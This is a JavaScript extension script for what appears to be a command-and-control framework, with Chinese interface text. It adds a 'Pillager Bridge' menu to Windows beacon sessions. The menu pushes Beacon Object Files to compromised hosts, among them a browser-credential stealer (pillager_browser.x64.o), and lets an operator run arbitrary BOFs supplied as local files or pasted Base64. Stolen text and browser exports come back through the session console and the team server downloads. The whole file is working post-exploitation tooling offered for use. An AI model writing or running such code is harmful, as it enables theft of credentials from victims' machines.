var metadata = {
 name: "Pillager Bridge",
 description: "从 teamserver 扩展目录 bofs/*.o 下发 BOF；可选本机文件或 Base64"
};

var Elements = {
 dialog: null,
 agent_id: null,
 bof_b64: null,
 chk_async: null
};

function serverBof(agents_id, name, async) {
 if (!agents_id || agents_id.length === 0)
  return;
 ax.service_command("pillager_bridge", "run_server_bof", {
  agent_id: agents_id[0],
  bof_name: name,
  async: async
 });
}

function quotePathForCmd(path) {
 if (!path || path.length === 0)
  return "";
 let escaped = path.replace(/"/g, '\\"');
 if (path.indexOf(" ") >= 0 || path.indexOf("\t") >= 0)
  return '"' + escaped + '"';
 return escaped;
}

function runBofFromFile(agents_id, async) {
 if (!agents_id || agents_id.length === 0)
  return;
 let path = ax.prompt_open_file("选择 BOF 对象文件（.o）", "Object Files (*.o);;COFF (*.obj);;All Files (*.*)");
 if (!path || path.length === 0)
  return;
 let q = quotePathForCmd(path);
 let cmd = async ? ("execute bof -a " + q) : ("execute bof " + q);
 ax.execute_command(agents_id[0], cmd);
}

function CreateDialog() {
 Elements.agent_id = form.create_textline("");
 Elements.agent_id.setPlaceholder("目标 Beacon 的 Agent ID");

 Elements.bof_b64 = form.create_textmulti("");
 Elements.bof_b64.setPlaceholder("BOF 内容 Base64");

 Elements.chk_async = form.create_check("异步执行 BOF（等同 execute bof -a）");
 Elements.chk_async.setChecked(true);

 let btn = form.create_button("下发 BOF 任务");
 form.connect(btn, "clicked", function() {
  let payload = {
   agent_id: Elements.agent_id.text().trim(),
   bof_base64: Elements.bof_b64.text().replace(/\s+/g, ""),
   async: Elements.chk_async.isChecked()
  };
  ax.service_command("pillager_bridge", "run_bof", payload);
 });

 let grid = form.create_gridlayout();
 grid.addWidget(form.create_label("Agent ID:"), 0, 0, 1, 1);
 grid.addWidget(Elements.agent_id, 0, 1, 1, 1);
 grid.addWidget(form.create_label("BOF (Base64):"), 1, 0, 1, 1);
 grid.addWidget(Elements.bof_b64, 1, 1, 1, 1);
 grid.addWidget(Elements.chk_async, 2, 0, 1, 2);
 grid.addWidget(btn, 3, 0, 1, 2);

 Elements.dialog = form.create_ext_dialog("Pillager Bridge（Base64）");
 Elements.dialog.setSize(560, 420);
 Elements.dialog.setLayout(grid);
 Elements.dialog.setButtonsText("关闭", "取消");
}

function OpenPillagerBase64Dialog(agents_id) {
 if (!Elements.dialog)
  CreateDialog();
 if (agents_id && agents_id.length > 0)
  Elements.agent_id.setText(agents_id[0]);
 Elements.dialog.show();
}

function InitService() {
 let m = menu.create_menu("Pillager Bridge");

 let s1 = menu.create_action("服务端：浏览器凭据 BOF（异步）", function(agents_id) {
  serverBof(agents_id, "pillager_browser.x64.o", true);
 });
 let s2 = menu.create_action("服务端：浏览器凭据 BOF（同步）", function(agents_id) {
  serverBof(agents_id, "pillager_browser.x64.o", false);
 });
 let s3 = menu.create_action("服务端：Pillager Mini BOF（异步）", function(agents_id) {
  serverBof(agents_id, "pillager_mini.x64.o", true);
 });
 let s4 = menu.create_action("服务端：Pillager Mini BOF（同步）", function(agents_id) {
  serverBof(agents_id, "pillager_mini.x64.o", false);
 });

 let adv = menu.create_menu("高级（本机 / Base64）");
 let a1 = menu.create_action("从本机选 BOF（异步）", function(agents_id) {
  runBofFromFile(agents_id, true);
 });
 let a2 = menu.create_action("从本机选 BOF（同步）", function(agents_id) {
  runBofFromFile(agents_id, false);
 });
 let a3 = menu.create_action("粘贴 Base64 下发…", function(agents_id) {
  OpenPillagerBase64Dialog(agents_id);
 });
 adv.addItem(a1);
 adv.addItem(a2);
 adv.addItem(a3);

 m.addItem(s1);
 m.addItem(s2);
 m.addItem(s3);
 m.addItem(s4);
 m.addItem(adv);
 menu.add_session_agent(m, ["beacon"], ["windows"]);
}

function data_handler(data) {
 let r = JSON.parse(data);
 if (r.action === "run_result") {
  if (r.success) {
   let tid = r.task_id || "?";
   let aid = r.agent_id || "?";
   let msg = "任务已创建。\n\n" +
    "Agent: " + aid + "\n" +
    "Task:  " + tid + "\n\n" +
    "读取到的文本数据会出现在该 Beacon 会话控制台（BOF BeaconPrintf）。\n" +
    "浏览器导出等大文件请在团队端「下载」中查看。";
   ax.show_message("Pillager Bridge", msg);
  } else {
   ax.show_message("Pillager Bridge 错误", r.error || "失败");
  }
 }
}

InitService();
